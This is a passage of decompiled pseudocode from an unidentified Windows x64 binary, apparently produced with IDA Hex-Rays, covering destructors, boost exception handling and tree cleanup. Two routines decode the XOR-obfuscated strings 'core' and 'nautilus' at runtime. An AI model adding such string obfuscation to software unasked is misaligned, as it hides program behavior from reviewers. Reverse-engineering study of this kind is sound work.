  *(_DWORD *)((char *)a1 + v4 + 108) = v4 - 16;
  sub_140011530(a1);
  v3[16] = &off_1400A3CB8;
  if ( v2 & 1 )
    operator delete(v3);
  return v3;
}
// 1400A3CB8: using guessed type void *off_1400A3CB8;
// 1400A3D28: using guessed type __int64 (__fastcall *off_1400A3D28)(void *);
// 1400A3D38: using guessed type __int64 (__fastcall *off_1400A3D38[2])();
// 1400A3D40: using guessed type __int64 (__fastcall *off_1400A3D40)();

//----- (0000000140011C70) ----------------------------------------------------
_QWORD *__fastcall sub_140011C70(void *a1, char a2)
{
  char v2; // bl
  _QWORD *v3; // rdi

  v2 = a2;
  v3 = a1;
  sub_140011410(a1);
  v3[10] = &off_1400A3CB8;
  if ( v2 & 1 )
    operator delete(v3);
  return v3;
}
// 1400A3CB8: using guessed type void *off_1400A3CB8;

//----- (0000000140011CB0) ----------------------------------------------------
_QWORD *__fastcall sub_140011CB0(void *a1, char a2)
{
  char v2; // bl
  _QWORD *v3; // rdi

  v2 = a2;
  v3 = a1;
  sub_1400114A0(a1);
  v3[10] = &off_1400A3CB8;
  if ( v2 & 1 )
    operator delete(v3);
  return v3;
}
// 1400A3CB8: using guessed type void *off_1400A3CB8;

//----- (0000000140011CF0) ----------------------------------------------------
void *__fastcall sub_140011CF0(void *a1, char a2)
{
  char v2; // bl
  void *v3; // rdi

  v2 = a2;
  v3 = a1;
  sub_140011530(a1);
  if ( v2 & 1 )
    operator delete(v3);
  return v3;
}

//----- (0000000140011D20) ----------------------------------------------------
_QWORD *__fastcall sub_140011D20(_QWORD *a1, char a2)
{
  _QWORD *v2; // rbx

  v2 = a1;
  *a1 = &off_1400A2B48;
  if ( a2 & 1 )
    operator delete(a1);
  return v2;
}
// 1400A2B48: using guessed type __int64 (__fastcall *off_1400A2B48)();

//----- (0000000140011D50) ----------------------------------------------------
void *__fastcall sub_140011D50(void *a1, char a2)
{
  char v2; // bl
  void *v3; // rdi

  v2 = a2;
  v3 = a1;
  *(_QWORD *)a1 = &loc_1400A3C88;
  std::exception::~exception((std::exception *)a1);
  if ( v2 & 1 )
    operator delete(v3);
  return v3;
}
// 1400A1988: using guessed type _QWORD std::exception::~exception(std::exception *__hidden this);

//----- (0000000140011D90) ----------------------------------------------------
_QWORD *__fastcall sub_140011D90(void *a1, char a2)
{
  _QWORD *v2; // rbx
  std::exception *v3; // rcx
  char v4; // di
  __int64 v5; // rcx

  v2 = a1;
  v3 = (std::exception *)((char *)a1 + 40);
  *((_QWORD *)v3 - 5) = &off_1400A3D00;
  v4 = a2;
  *(_QWORD *)v3 = &loc_1400A3C88;
  std::exception::~exception(v3);
  *v2 = &off_1400A3CB0;
  v5 = v2[1];
  if ( v5 && (*(unsigned __int8 (**)(void))(*(_QWORD *)v5 + 32i64))() )
    v2[1] = 0i64;
  if ( v4 & 1 )
    operator delete(v2);
  return v2;
}
// 1400A1988: using guessed type _QWORD std::exception::~exception(std::exception *__hidden this);
// 1400A3CB0: using guessed type void *off_1400A3CB0;
// 1400A3D00: using guessed type __int64 (__fastcall *off_1400A3D00)(void *);

//----- (0000000140011E00) ----------------------------------------------------
_QWORD *__fastcall sub_140011E00(_QWORD *a1, char a2)
{
  _QWORD *v2; // rbx

  v2 = a1;
  *a1 = &off_1400A3CB8;
  if ( a2 & 1 )
    operator delete(a1);
  return v2;
}
// 1400A3CB8: using guessed type void *off_1400A3CB8;

//----- (0000000140011E30) ----------------------------------------------------
_QWORD *__fastcall sub_140011E30(void *a1, char a2)
{
  char v2; // di
  _QWORD *v3; // rbx

  v2 = a2;
  v3 = a1;
  *(_QWORD *)a1 = &loc_1400A3CD0;
  if ( *((_QWORD *)a1 + 8) >= 0x10ui64 )
    operator delete(*((void **)a1 + 5));
  v3[8] = 15i64;
  v3[7] = 0i64;
  *((_BYTE *)v3 + 40) = 0;
  std::exception::~exception((std::exception *)v3);
  if ( v2 & 1 )
    operator delete(v3);
  return v3;
}
// 1400A1988: using guessed type _QWORD std::exception::~exception(std::exception *__hidden this);

//----- (0000000140011EA0) ----------------------------------------------------
__int64 __fastcall sub_140011EA0(__int64 a1, _QWORD *a2, __int64 *a3, __int64 a4, _QWORD *a5, _QWORD *a6, __int64 *a7)
{
  __int64 v7; // rbx
  __int64 v8; // rdi
  char v10; // [rsp+50h] [rbp-108h]

  v7 = a4;
  v8 = a1;
  sub_140010F60((__int64 *)&v10, a2, a5, a6, a3, a7);
  sub_140011F50(&v10, v8, v7);
  sub_140011760(&v10);
  return v8;
}
// 140011760: using guessed type __int64 __fastcall sub_140011760(_QWORD);
// 140011F50: using guessed type __int64 __fastcall sub_140011F50(_QWORD, _QWORD, _QWORD);

//----- (0000000140012790) ----------------------------------------------------
_DWORD *__fastcall sub_140012790(void *Src)
{
  int v1; // er10
  unsigned int v2; // edi
  _DWORD *v3; // rbx
  int v4; // er9
  char v5; // r9
  _DWORD *v6; // rax
  bool v7; // cf
  _DWORD *v8; // rax
  __int64 v9; // rdx
  _DWORD *v10; // r8
  char v11; // al
  char v12; // cl

  v1 = dword_1400D9C5C;
  v2 = 0;
  v3 = Src;
  if ( dword_1400D9C5C & 1 )
  {
    v5 = byte_1400D9C58;
  }
  else
  {
    v4 = 69069 * dword_1400D9C14 + 1234567;
    v1 = dword_1400D9C5C | 1;
    dword_1400D9C14 = v4;
    dword_1400D9C5C |= 1u;
    dword_1400D9C0C = HIWORD(dword_1400D9C0C) + 36969 * (unsigned __int16)dword_1400D9C0C;
    LOBYTE(v4) = (BYTE2(dword_1400D9C24) + 80 * dword_1400D9C24) ^ v4;
    dword_1400D9C24 = HIWORD(dword_1400D9C24) + 18000 * (unsigned __int16)dword_1400D9C24;
    v5 = (((unsigned int)dword_1400D9C10 >> 13) ^ 32 * dword_1400D9C10 ^ dword_1400D9C10) + v4;
    dword_1400D9C10 ^= ((unsigned int)dword_1400D9C10 >> 13) ^ 32 * (dword_1400D9C10 ^ (dword_1400D9C10 << 12));
    byte_1400D9C58 = v5;
  }
  if ( !(v1 & 2) )
  {
    dword_1400D9C5C = v1 | 2;
    byte_1400D9C60[0] = v5 ^ 0x63;
    byte_1400D9C61 = (v5 - 1) ^ 0x6F;
    byte_1400D9C62 = (v5 - 2) ^ 0x72;
    byte_1400D9C63 = (v5 - 3) ^ 0x65;
  }
  *((_QWORD *)Src + 3) = 15i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_BYTE *)Src = 0;
  if ( *((_QWORD *)Src + 3) < 4ui64 )
  {
    sub_140004790(Src, 4ui64, 0i64);
    v5 = byte_1400D9C58;
  }
  if ( *((_QWORD *)v3 + 3) < 0x10ui64 )
    v6 = v3;
  else
    v6 = *(_DWORD **)v3;
  *v6 = 0;
  v7 = *((_QWORD *)v3 + 3) < 0x10ui64;
  *((_QWORD *)v3 + 2) = 4i64;
  if ( v7 )
    v8 = v3;
  else
    v8 = *(_DWORD **)v3;
  *((_BYTE *)v8 + 4) = 0;
  v9 = 0i64;
  do
  {
    if ( *((_QWORD *)v3 + 3) < 0x10ui64 )
      v10 = v3;
    else
      v10 = *(_DWORD **)v3;
    v11 = byte_1400D9C60[v9++];
    v12 = v5 - v2++;
    *((_BYTE *)v10 + v9 - 1) = v12 ^ v11;
  }
  while ( v2 < 4 );
  return v3;
}
// 1400D9C0C: using guessed type int dword_1400D9C0C;
// 1400D9C10: using guessed type int dword_1400D9C10;
// 1400D9C14: using guessed type int dword_1400D9C14;
// 1400D9C24: using guessed type int dword_1400D9C24;
// 1400D9C58: using guessed type char byte_1400D9C58;
// 1400D9C5C: using guessed type int dword_1400D9C5C;
// 1400D9C61: using guessed type char byte_1400D9C61;
// 1400D9C62: using guessed type char byte_1400D9C62;
// 1400D9C63: using guessed type char byte_1400D9C63;

//----- (0000000140012930) ----------------------------------------------------
_QWORD *__fastcall sub_140012930(void *Src)
{
  int v1; // er10
  unsigned int v2; // edi
  _QWORD *v3; // rbx
  int v4; // er9
  char v5; // r9
  _QWORD *v6; // rax
  bool v7; // cf
  _QWORD *v8; // rax
  __int64 v9; // rdx
  _QWORD *v10; // r8
  char v11; // al
  char v12; // cl

  v1 = dword_1400D9C4C;
  v2 = 0;
  v3 = Src;
  if ( dword_1400D9C4C & 1 )
  {
    v5 = byte_1400D9C49;
  }
  else
  {
    v4 = 69069 * dword_1400D9C14 + 1234567;
    v1 = dword_1400D9C4C | 1;
    dword_1400D9C14 = v4;
    dword_1400D9C4C |= 1u;
    dword_1400D9C0C = HIWORD(dword_1400D9C0C) + 36969 * (unsigned __int16)dword_1400D9C0C;
    LOBYTE(v4) = (BYTE2(dword_1400D9C24) + 80 * dword_1400D9C24) ^ v4;
    dword_1400D9C24 = HIWORD(dword_1400D9C24) + 18000 * (unsigned __int16)dword_1400D9C24;
    v5 = (((unsigned int)dword_1400D9C10 >> 13) ^ 32 * dword_1400D9C10 ^ dword_1400D9C10) + v4;
    dword_1400D9C10 ^= ((unsigned int)dword_1400D9C10 >> 13) ^ 32 * (dword_1400D9C10 ^ (dword_1400D9C10 << 12));
    byte_1400D9C49 = v5;
  }
  if ( !(v1 & 2) )
  {
    dword_1400D9C4C = v1 | 2;
    byte_1400D9C50[0] = v5 ^ 0x6E;
    byte_1400D9C51 = (v5 - 1) ^ 0x61;
    byte_1400D9C52 = (v5 - 2) ^ 0x75;
    byte_1400D9C53 = (v5 - 3) ^ 0x74;
    byte_1400D9C54 = (v5 - 4) ^ 0x69;
    byte_1400D9C55 = (v5 - 5) ^ 0x6C;
    byte_1400D9C56 = (v5 - 6) ^ 0x75;
    byte_1400D9C57 = (v5 - 7) ^ 0x73;
  }
  *((_QWORD *)Src + 3) = 15i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_BYTE *)Src = 0;
  if ( *((_QWORD *)Src + 3) < 8ui64 )
  {
    sub_140004790(Src, 8ui64, 0i64);
    v5 = byte_1400D9C49;
  }
  if ( v3[3] < 0x10ui64 )
    v6 = v3;
  else
    v6 = (_QWORD *)*v3;
  *v6 = 0i64;
  v7 = v3[3] < 0x10ui64;
  v3[2] = 8i64;
  if ( v7 )
    v8 = v3;
  else
    v8 = (_QWORD *)*v3;
  *((_BYTE *)v8 + 8) = 0;
  v9 = 0i64;
  do
  {
    if ( v3[3] < 0x10ui64 )
      v10 = v3;
    else
      v10 = (_QWORD *)*v3;
    v11 = byte_1400D9C50[v9++];
    v12 = v5 - v2++;
    *((_BYTE *)v10 + v9 - 1) = v12 ^ v11;
  }
  while ( v2 < 8 );
  return v3;
}
// 1400D9C0C: using guessed type int dword_1400D9C0C;
// 1400D9C10: using guessed type int dword_1400D9C10;
// 1400D9C14: using guessed type int dword_1400D9C14;
// 1400D9C24: using guessed type int dword_1400D9C24;
// 1400D9C49: using guessed type char byte_1400D9C49;
// 1400D9C4C: using guessed type int dword_1400D9C4C;
// 1400D9C51: using guessed type char byte_1400D9C51;
// 1400D9C52: using guessed type char byte_1400D9C52;
// 1400D9C53: using guessed type char byte_1400D9C53;
// 1400D9C54: using guessed type char byte_1400D9C54;
// 1400D9C55: using guessed type char byte_1400D9C55;
// 1400D9C56: using guessed type char byte_1400D9C56;
// 1400D9C57: using guessed type char byte_1400D9C57;

//----- (0000000140012B00) ----------------------------------------------------
void __fastcall sub_140012B00(_QWORD *a1, __int64 a2, _QWORD *a3, _QWORD *a4, __int64 **a5, char a6, char a7)
{
  _QWORD *v7; // r14
  _QWORD *v8; // rbx
  _QWORD *v9; // rdi
  _QWORD *v10; // r15
  volatile signed __int32 *v11; // rdi
  _QWORD *v12; // rax
  __int64 v13; // rax
  __int64 v14; // rax
  _QWORD *v15; // rax
  void *v16; // rcx
  _QWORD *v17; // rbx
  _QWORD *v18; // rax
  _QWORD *v19; // rbx
  _QWORD *v20; // rax
  bool v21; // di
  _QWORD *v22; // rsi
  volatile signed __int32 *v23; // rdi
  void *v24; // rax
  __int64 v25; // rax
  __int64 v26; // rax
  _QWORD *v27; // rdi
  __int64 *v28; // rax
  __int64 v29; // rdx
  volatile signed __int32 *v30; // rbx
  volatile signed __int32 *v31; // rbx
  __int64 *v32; // rbx
  _QWORD *v33; // r12
  __int64 *v34; // r14
  _QWORD *v35; // rsi
  __int64 v36; // rdi
  _QWORD *v37; // rax
  __int64 **v38; // rax
  __int64 *j; // rax
  __int64 *i; // rax
  volatile signed __int32 *v41; // rbx
  __int128 v42; // [rsp+20h] [rbp-C1h]
  volatile signed __int32 *v43; // [rsp+30h] [rbp-B1h]
  _QWORD *v44; // [rsp+38h] [rbp-A9h]
  volatile signed __int32 *v45; // [rsp+40h] [rbp-A1h]
  _QWORD *v46; // [rsp+48h] [rbp-99h]
  _QWORD *v47; // [rsp+50h] [rbp-91h]
  _QWORD *v48; // [rsp+58h] [rbp-89h]
  void *v49; // [rsp+60h] [rbp-81h]
  __int64 v50; // [rsp+70h] [rbp-71h]
  void *v51; // [rsp+78h] [rbp-69h]
  unsigned __int64 v52; // [rsp+90h] [rbp-51h]
  void *v53; // [rsp+98h] [rbp-49h]
  unsigned __int64 v54; // [rsp+B0h] [rbp-31h]
  void *Src; // [rsp+B8h] [rbp-29h]
  unsigned __int64 v56; // [rsp+D0h] [rbp-11h]

  v50 = -2i64;
  v7 = a4;
  v48 = a4;
  v8 = a3;
  v9 = (_QWORD *)a2;
  v47 = (_QWORD *)a2;
  v10 = a1;
  if ( !*(_QWORD *)(a2 + 16) || !a3[2] || !a4[2] )
    return;
  _mm_storeu_si128((__m128i *)&v42, (__m128i)0i64);
  if ( (unsigned int)sub_14000B9E0(a4, a1) )
  {
    if ( !(unsigned int)sub_14000B9E0(v7, v10 + 4) )
    {
      v17 = operator new(0x38ui64);
      v46 = v17;
      if ( v17 )
      {
        v18 = (_QWORD *)sub_140012520(v10, &v49, v7);
        v19 = sub_14002A110(v17, v9, v18);
      }
      else
      {
        v19 = 0i64;
      }
      sub_140010920((__int64 *)&v42, (__int64)v19);
      goto LABEL_53;
    }
    v20 = sub_140012930(&Src);
    v21 = (unsigned int)sub_14000B9E0(v7, v20) == 0;
    if ( v56 >= 0x10 )
      operator delete(Src);
    if ( !v21 )
      goto LABEL_53;
    sub_140003DE0(&v53, v10 + 12, v8);
    v22 = operator new(0x28ui64);
    v46 = v22;
    if ( v22 )
    {
      v23 = (volatile signed __int32 *)operator new(0xD8ui64);
      v43 = v23;
      if ( v23 )
      {
        v24 = operator new(0x30ui64);
        v49 = v24;
        if ( v24 )
          v25 = sub_14002B5B0((__int64)v24);
        else
          v25 = 0i64;
        v26 = sub_1400232F0(v23, &v53, v25);
      }
      else
      {
        v26 = 0i64;
      }
      v27 = sub_140022630(v22, v10 + 18, v26);
    }
    else
    {
      v27 = 0i64;
    }
    v44 = v27;
    v45 = 0i64;
    v28 = sub_14000F8B0(&v43, (__int64)v27);
    v29 = (__int64)v45;
    v45 = (volatile signed __int32 *)*v28;
    *v28 = v29;
    v30 = v43;
    if ( v43 )
    {
      if ( !_InterlockedDecrement(v43 + 2) )
      {
        (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v30 + 8i64))(v30);
        if ( !_InterlockedDecrement(v30 + 3) )
          (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v30 + 16i64))(v30);
      }
    }
    sub_140008430();
    sub_140011A50(v10 + 18, (__int64 *)&v44);
    v31 = v45;
    if ( v45 )
    {
      if ( !_InterlockedDecrement(v45 + 2) )
      {
        (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v31 + 8i64))(v31);
        if ( !_InterlockedDecrement(v31 + 3) )
          (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v31 + 16i64))(v31);
      }
    }
    if ( v54 < 8 )
      goto LABEL_53;
    v16 = v53;
    goto LABEL_52;
  }
  sub_140003DE0(&v51, v10 + 12, v8);
  if ( !a6 || (*(unsigned __int8 (__fastcall **)(_QWORD, void **))(*(_QWORD *)v10[16] + 8i64))(v10[16], &v51) )
  {
    v11 = (volatile signed __int32 *)operator new(0xD8ui64);
    v43 = v11;
    if ( v11 )
    {
      v12 = operator new(0x30ui64);
      v46 = v12;
      v13 = v12 ? sub_14002B5B0((__int64)v12) : 0i64;
      v14 = sub_1400232F0(v11, &v51, v13);
    }
    else
    {
      v14 = 0i64;
    }
    sub_140010840((__int64 *)&v42, v14);
    if ( !(*(unsigned __int8 (**)(void))(*(_QWORD *)v42 + 40i64))() )
      goto LABEL_76;
    if ( a7 )
    {
      if ( !v10[24] )
      {
        v15 = operator new(8ui64);
        if ( v15 )
          *v15 = &off_1400A2D48;
        else
          v15 = 0i64;
        sub_140010A00(v10 + 24, (__int64)v15);
      }
      if ( !(*(unsigned __int8 (__fastcall **)(_QWORD, _QWORD *))(*(_QWORD *)v42 + 56i64))(v42, v10 + 24) )
      {
LABEL_76:
        if ( v52 >= 8 )
          operator delete(v51);
        goto LABEL_70;
      }
    }
  }
  if ( v52 >= 8 )
  {
    v16 = v51;
LABEL_52:
    operator delete(v16);
  }
LABEL_53:
  v32 = (__int64 *)**a5;
  if ( v32 != *a5 )
  {
    v33 = v47;
    do
    {
      v34 = (__int64 *)v10[18];
      v35 = v32 + 4;
      if ( (unsigned __int64)v32[7] >= 0x10 )
        v35 = (_QWORD *)*v35;
      v36 = *v34;
      v37 = sub_140005190(v33);
      (*(void (__fastcall **)(__int64 *, _QWORD *, _QWORD *))(v36 + 16))(v34, v37, v35);
      if ( !*((_BYTE *)v32 + 25) )
      {
        v38 = (__int64 **)v32[2];
        if ( *((_BYTE *)v38 + 25) )
        {
          for ( i = (__int64 *)v32[1]; !*((_BYTE *)i + 25); i = (__int64 *)i[1] )
          {
            if ( v32 != (__int64 *)i[2] )
              break;
            v32 = i;
          }
          v32 = i;
        }
        else
        {
          v32 = (__int64 *)v32[2];
          for ( j = *v38; !*((_BYTE *)j + 25); j = (__int64 *)*j )
            v32 = j;
        }
      }
    }
    while ( v32 != *a5 );
    v7 = v48;
  }
  if ( (_QWORD)v42 )
    (*(void (__fastcall **)(_QWORD, __int128 *, _QWORD *, _QWORD *))(*(_QWORD *)v10[18] + 56i64))(
      v10[18],
      &v42,
      v47,
      v7);
LABEL_70:
  v41 = (volatile signed __int32 *)*((_QWORD *)&v42 + 1);
  if ( *((_QWORD *)&v42 + 1)
    && _InterlockedExchangeAdd((volatile signed __int32 *)(*((_QWORD *)&v42 + 1) + 8i64), 0xFFFFFFFF) == 1 )
  {
    (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v41 + 8i64))(v41);
    if ( _InterlockedExchangeAdd(v41 + 3, 0xFFFFFFFF) == 1 )
      (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v41 + 16i64))(v41);
  }
}
// 140012520: using guessed type __int64 __fastcall sub_140012520(_QWORD, _QWORD, _QWORD);
// 1400232F0: using guessed type __int64 __fastcall sub_1400232F0(_QWORD, _QWORD, _QWORD);
// 1400A2D48: using guessed type __int64 (__fastcall *off_1400A2D48)();

//----- (0000000140012FA0) ----------------------------------------------------
void sub_140012FA0()
{
  _QWORD *v0; // rax

  v0 = operator new(0x50ui64);
  if ( !v0 )
    std::_Xbad_alloc();
  *v0 = v0;
  if ( v0 != (_QWORD *)-8i64 )
    v0[1] = v0;
  if ( v0 != (_QWORD *)-16i64 )
    v0[2] = v0;
  *((_WORD *)v0 + 12) = 257;
}
// 1400A1778: using guessed type void std::_Xbad_alloc(void);

//----- (0000000140012FF0) ----------------------------------------------------
_QWORD *__fastcall sub_140012FF0(_QWORD *a1)
{
  _QWORD *v1; // rbx
  _QWORD *v2; // rdx

  v1 = a1;
  v2 = operator new(0x50ui64);
  if ( !v2 )
    std::_Xbad_alloc();
  *v2 = *v1;
  if ( v2 != (_QWORD *)-8i64 )
    v2[1] = *v1;
  if ( v2 != (_QWORD *)-16i64 )
    v2[2] = *v1;
  return v2;
}
// 1400A1778: using guessed type void std::_Xbad_alloc(void);

//----- (0000000140013050) ----------------------------------------------------
__int64 __fastcall sub_140013050(__int64 a1, void **a2)
{
  void **v2; // rbp
  __int64 result; // rax
  void **i; // rsi
  void **v5; // rdi
  volatile signed __int32 *v6; // rbx
  __int64 v7; // [rsp+50h] [rbp+8h]

  v7 = a1;
  v2 = a2;
  result = a1;
  for ( i = a2; !*((_BYTE *)i + 25); result = v7 )
  {
    sub_140013050(result, i[2]);
    i = (void **)*i;
    v5 = v2 + 4;
    v6 = (volatile signed __int32 *)v2[9];
    if ( v6 )
    {
      if ( !_InterlockedDecrement(v6 + 2) )
      {
        (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v6 + 8i64))(v6);
        if ( !_InterlockedDecrement(v6 + 3) )
          (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v6 + 16i64))(v6);
      }
    }
    if ( (unsigned __int64)v2[7] >= 0x10 )
      operator delete(*v5);
    v2[7] = (void *)15;
    v2[6] = 0i64;
    *(_BYTE *)v5 = 0;
    operator delete(v2);
    v2 = i;
  }
  return result;
}

//----- (0000000140013108) ----------------------------------------------------
signed __int64 __fastcall sub_140013108(__int64 a1)
{
  return sub_140013120(a1 - *(signed int *)(a1 - 4));
}

//----- (0000000140013120) ----------------------------------------------------
signed __int64 __fastcall sub_140013120(__int64 a1)
{
  __int64 v1; // rbx
  _QWORD *v2; // rax
  _QWORD *v3; // rdx
  signed __int64 result; // rax

  v1 = a1;
  v2 = operator new(0x88ui64);
  if ( v2 )
    v3 = sub_140010BA0(v2, (const struct std::exception *)(v1 - 128), 0i64, 1);
  else
    v3 = 0i64;
  if ( v3 )
    result = (signed __int64)v3 + *(signed int *)(v3[14] + 4i64) + 112;
  else
    result = 0i64;
  return result;
}

//----- (0000000140013184) ----------------------------------------------------
signed __int64 __fastcall sub_140013184(__int64 a1)
{
  return sub_140013190(a1 - *(signed int *)(a1 - 4));
}

//----- (0000000140013190) ----------------------------------------------------
signed __int64 __fastcall sub_140013190(__int64 a1)
{
  __int64 v1; // rbx
  _QWORD *v2; // rax
  _QWORD *v3; // rdi
  __int64 v4; // rcx
  signed __int64 result; // rax

  v1 = a1;
  v2 = operator new(0x58ui64);
  v3 = v2;
  if ( v2 )
  {
    v2[8] = &unk_1400A3D90;
    v2[10] = &off_1400A3CB8;
    sub_1400111E0(v2, v1 - 80);
    *v3 = &off_1400A3D60;
    v3[5] = &off_1400A3D68;
    *(_QWORD *)((char *)v3 + *(signed int *)(v3[8] + 4i64) + 64) = &off_1400A3D78;
    v4 = *(signed int *)(v3[8] + 4i64);
    *(_DWORD *)((char *)v3 + v4 + 60) = v4 - 16;
    sub_140013340((__int64)v3, v1 - 80);
  }
  else
  {
    v3 = 0i64;
  }
  if ( v3 )
    result = (signed __int64)v3 + *(signed int *)(v3[8] + 4i64) + 64;
  else
    result = 0i64;
  return result;
}
// 1400A3CB8: using guessed type void *off_1400A3CB8;
// 1400A3D60: using guessed type __int64 (__fastcall *off_1400A3D60)(void *);
// 1400A3D68: using guessed type __int64 (__fastcall *off_1400A3D68)();
// 1400A3D78: using guessed type __int64 (__fastcall *off_1400A3D78)();

//----- (0000000140013260) ----------------------------------------------------
__int64 __fastcall sub_140013260(__int64 a1)
{
  return sub_140013270(a1 - *(signed int *)(a1 - 4));
}
// 140013270: using guessed type __int64 __fastcall sub_140013270(_QWORD);

//----- (0000000140013340) ----------------------------------------------------
__int64 __fastcall sub_140013340(__int64 a1, __int64 a2)
{
  __int64 v2; // rsi
  __int64 v3; // rdi
  __int64 v4; // rbx
  __int64 v5; // rcx
  __int64 result; // rax
  __int64 v7; // rcx
  __int64 v8; // [rsp+48h] [rbp+10h]

  v2 = a2;
  v3 = a1;
  v4 = 0i64;
  v5 = *(_QWORD *)(a2 + 8);
  if ( v5 )
  {
    v4 = *(_QWORD *)(*(__int64 (__fastcall **)(__int64, __int64 *))(*(_QWORD *)v5 + 40i64))(v5, &v8);
    if ( v4 )
      (*(void (__fastcall **)(__int64))(*(_QWORD *)v4 + 24i64))(v4);
    if ( v8 )
      (*(void (__cdecl **)(__int64))(*(_QWORD *)v8 + 32i64))(v8);
  }
  *(_QWORD *)(v3 + 24) = *(_QWORD *)(v2 + 24);
  *(_DWORD *)(v3 + 32) = *(_DWORD *)(v2 + 32);
  result = *(_QWORD *)(v2 + 16);
  *(_QWORD *)(v3 + 16) = result;
  v7 = *(_QWORD *)(v3 + 8);
  if ( v7 )
  {
    result = (*(__int64 (__cdecl **)(__int64))(*(_QWORD *)v7 + 32i64))(v7);
    if ( (_BYTE)result )
      *(_QWORD *)(v3 + 8) = 0i64;
  }
  *(_QWORD *)(v3 + 8) = v4;
  if ( v4 )
    result = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v4 + 24i64))(v4);
  if ( v4 )
    result = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v4 + 32i64))(v4);
  return result;
}

//----- (0000000140013410) ----------------------------------------------------
HANDLE __fastcall sub_140013410(BOOL bManualReset, BOOL bInitialState)
{
  HANDLE result; // rax
  __int64 v3; // rcx
  const char *v4; // [rsp+20h] [rbp-88h]
  __int128 v5; // [rsp+28h] [rbp-80h]
  __int64 v6; // [rsp+38h] [rbp-70h]
  void *v7; // [rsp+40h] [rbp-68h]
  __int128 v8; // [rsp+58h] [rbp-50h]
  char v9; // [rsp+68h] [rbp-40h]
  __int64 v10; // [rsp+78h] [rbp-30h]
  __int64 v11; // [rsp+80h] [rbp-28h]

  v6 = -2i64;
  result = CreateEventA(0i64, bManualReset, bInitialState, 0i64);
  if ( !result )
  {
    LODWORD(v5) = 11;
    *((_QWORD *)&v5 + 1) = sub_140030C00(v3);
    v4 = "boost::thread_resource_error";
    std::exception::exception((std::exception *)&v7, &v4);
    v8 = v5;
    v11 = 15i64;
    v10 = 0i64;
    v9 = 0;
    v7 = &loc_1400A3CD0;
    sub_140010B60((const struct std::exception *)&v7);
  }
  return result;
}
// 140030C00: using guessed type __int64 __cdecl sub_140030C00(_QWORD);
// 1400A1998: using guessed type _QWORD std::exception::exception(std::exception *__hidden this, const char *const *);

//----- (00000001400134D0) ----------------------------------------------------
__int64 *__fastcall sub_1400134D0(__int64 **a1, __int64 *a2, __int64 a3, __int64 a4)
{
  __int64 *v4; // rdi
  __int64 *v5; // rdx
  __int64 **v6; // rbx
  __int64 *v7; // rax
  __int64 v8; // rcx
  __int64 *result; // rax
  __int64 *v10; // rax
  __int64 v11; // rdx
  __int64 j; // rcx
  __int64 i; // rcx
  char v14; // [rsp+30h] [rbp+8h]
  __int64 v15; // [rsp+40h] [rbp+18h]
  __int64 v16; // [rsp+48h] [rbp+20h]

  v16 = a4;
  v15 = a3;
  v4 = a2;
  v5 = *a1;
  v6 = a1;
  if ( a3 != **a1 || (__int64 *)a4 != v5 )
  {
    if ( a3 != a4 )
    {
      do
      {
        v10 = (__int64 *)a3;
        if ( !*(_BYTE *)(a3 + 25) )
        {
          v11 = *(_QWORD *)(a3 + 16);
          if ( *(_BYTE *)(v11 + 25) )
          {
            for ( i = *(_QWORD *)(a3 + 8); !*(_BYTE *)(i + 25); i = *(_QWORD *)(i + 8) )
            {
              if ( a3 != *(_QWORD *)(i + 16) )
                break;
              v15 = i;
              a3 = i;
            }
            v15 = i;
          }
          else
          {
            for ( j = *(_QWORD *)v11; !*(_BYTE *)(j + 25); j = *(_QWORD *)j )
              v11 = j;
            v15 = v11;
          }
        }
        sub_1400135D0(v6, &v14, v10);
        a3 = v15;
      }
      while ( v15 != v16 );
    }
    *v4 = a3;
    result = v4;
  }
  else
  {
    sub_140013050((__int64)a1, (void **)v5[1]);
    (*v6)[1] = (__int64)*v6;
    **v6 = (__int64)*v6;
    (*v6)[2] = (__int64)*v6;
    v7 = *v6;
    v6[1] = 0i64;
    v8 = *v7;
    result = v4;
    *v4 = v8;
  }
  return result;
}

//----- (00000001400135D0) ----------------------------------------------------
_QWORD *__fastcall sub_1400135D0(_QWORD *a1, _QWORD *a2, __int64 *a3)
{
  _QWORD *v3; // rbp
  _QWORD *v4; // r15
  __int64 *v5; // r14
  __int64 **v6; // rax
  __int64 *j; // rax
  __int64 *i; // rax
  _QWORD *v9; // rdi
  __int64 *v10; // rbx
  __int64 *v11; // rcx
  __int64 *v12; // rax
  __int64 *v13; // rcx
  __int64 k; // rax
  __int64 **v15; // rax
  char v16; // cl
  _BYTE *v17; // rcx
  __int64 **v18; // rcx
  __int64 **v19; // rax
  __int64 v20; // rcx
  __int64 v21; // rax
  _QWORD *v22; // rax
  void **v23; // rdi
  volatile signed __int32 *v24; // rbx
  __int64 v25; // rax
  __int64 *v27; // [rsp+70h] [rbp+18h]

  v27 = a3;
  v3 = a2;
  v4 = a1;
  v5 = a3;
  if ( !*((_BYTE *)a3 + 25) )
  {
    v6 = (__int64 **)a3[2];
    if ( *((_BYTE *)v6 + 25) )
    {
      for ( i = (__int64 *)a3[1]; !*((_BYTE *)i + 25); i = (__int64 *)i[1] )
      {
        if ( a3 != (__int64 *)i[2] )
          break;
        a3 = i;
      }
      a3 = i;
      v27 = i;
    }
    else
    {
      a3 = (__int64 *)a3[2];
      for ( j = *v6; !*((_BYTE *)j + 25); j = (__int64 *)*j )
        a3 = j;
      v27 = a3;
    }
  }
  if ( *(_BYTE *)(*v5 + 25) )
  {
    v9 = (_QWORD *)v5[2];
LABEL_15:
    v10 = (__int64 *)v5[1];
    if ( !*((_BYTE *)v9 + 25) )
      v9[1] = v10;
    if ( *(__int64 **)(*a1 + 8i64) == v5 )
    {
      *(_QWORD *)(*a1 + 8i64) = v9;
    }
    else if ( (__int64 *)*v10 == v5 )
    {
      *v10 = (__int64)v9;
    }
    else
    {
      v10[2] = (__int64)v9;
    }
    if ( *(__int64 **)*a1 == v5 )
    {
      if ( *((_BYTE *)v9 + 25) )
      {
        v11 = v10;
      }
      else
      {
